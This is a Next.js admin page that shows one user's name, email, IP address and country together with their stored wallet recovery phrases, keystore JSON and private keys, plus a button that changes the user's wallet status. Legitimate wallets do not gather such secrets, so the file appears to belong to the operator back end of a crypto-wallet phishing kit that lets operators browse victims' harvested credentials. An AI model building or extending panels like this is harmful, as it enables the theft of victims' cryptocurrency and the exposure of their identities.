import UserClientButton from "@/components/admin/UserClientButton";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { auth, User as UserType } from "@/lib/auth";
import Wallet from "@/models/wallet.model";
import { headers } from "next/headers";
import { notFound } from 'next/navigation';

type Props = { params: Promise<{ userId: string }> }

async function User({ params }: Props) {
  try {
    const userId = (await params).userId;

    const [wallet, userInfo] = await Promise.all([
      Wallet.find({ userId: userId }),
      auth.api.getUser({
        query: { id: userId },
        headers: await headers()
      })
    ]);

    if (!userInfo) {
      notFound();
    }

    const user = {
      firstName: userInfo.name.split(" ")[0],
      lastName: userInfo.name.split(" ")[1],
      email: userInfo.email,
      userId: userInfo.id,
      ipAddress: (userInfo as any).ipAddress || "N/A",
      country: (userInfo as any).country || "N/A",
      phrases: wallet[0]?.phrases,
      keystorejson: wallet[0]?.keystorejson,
      privateKey: wallet[0]?.privatekey,
      walletStatus: (userInfo as UserType).walletStatus
    };

    return (
      <section className="max-w-5xl mx-auto">
        <div className="space-y-8">
          <h2 className="text-xl font-semibold mb-2">User Details</h2>
          <div className="overflow-x-auto">
            <Table className="min-w-[600px]">
              <TableHeader>
                <TableRow>
                  <TableHead>First Name</TableHead>
                  <TableHead>Last Name</TableHead>
                  <TableHead>Email</TableHead>
                  <TableHead>IP Address</TableHead>
                  <TableHead>Country</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                <TableRow>
                  <TableCell>{user.firstName}</TableCell>
                  <TableCell>{user.lastName}</TableCell>
                  <TableCell>{user.email}</TableCell>
                  <TableCell className="font-mono text-sm">{user.ipAddress}</TableCell>
                  <TableCell>{user.country}</TableCell>
                </TableRow>
              </TableBody>
            </Table>
          </div>

          <div>
            <h2 className="text-xl font-semibold mb-2">Phrases</h2>
            <div className="overflow-x-auto">
              {user.phrases && wallet.length > 0 ? (
                <ul className="flex flex-col gap-4 min-w-[400px] pl-3">
                  {user.phrases.map((phrase, idx) => (
                    <li key={idx} className="whitespace-nowrap">{phrase}</li>
                  ))}
                </ul>
              ) : (
                <div className="text-gray-500">No data found</div>
              )}
            </div>
          </div>

          <div>
            <h2 className="text-xl font-semibold mb-2">Keystore Json</h2>
            <div className="overflow-x-auto">
              {user.keystorejson && wallet.length > 0 ? (
                <ul className="flex flex-col gap-4 min-w-[400px] pl-3">
                  {user.keystorejson.map((phrase, idx) => (
                    <li key={idx} className="whitespace-nowrap">{phrase}</li>
                  ))}
                </ul>
              ) : (
                <div className="text-gray-500">No data found</div>
              )}
            </div>
          </div>

          <div>
            <h2 className="text-xl font-semibold mb-2">Private Key</h2>
            <div className="overflow-x-auto">
              {user.privateKey && wallet.length > 0 ? (
                <ul className="flex flex-col gap-4 min-w-[400px] pl-3">
                  {user.privateKey.map((phrase, idx) => (
                    <li key={idx} className="whitespace-nowrap">{phrase}</li>
                  ))}
                </ul>
              ) : (
                <div className="text-gray-500">No data found</div>
              )}
            </div>
          </div>

          <UserClientButton walletStatus={user.walletStatus} userId={user.userId} />
        </div>
      </section>
    )
  } catch (error) {
    console.log(error);
    return (
      <div className="max-w-5xl mx-auto text-center text-red-700 py-6">
        An error occurred while fetching user data.
      </div>
    );
  }
}

export default User;